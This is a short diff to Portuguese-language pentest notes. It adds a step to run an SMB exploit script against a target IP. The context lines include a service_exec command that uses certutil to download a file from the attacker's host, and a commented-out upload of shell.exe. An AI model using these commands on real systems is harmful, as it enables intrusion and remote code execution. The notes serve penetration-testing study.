@@ -74,6 +74,10 @@ python3 -m http.server 80
 #smb_send_file(smbConn, './shell.exe', 'C', '/shell.exe') #922
 service_exec(conn, r'cmd /c certutil.exe -urlcache -f http://<your ip>:80/test test') #923
 ```
+- Agora basta executar o exploit
+```bash
+python2 exploit.py <target ip>
+```
 
 ## Comandos úteis do Windows para pentest
 - Comando para desligar o Firewall do Windows
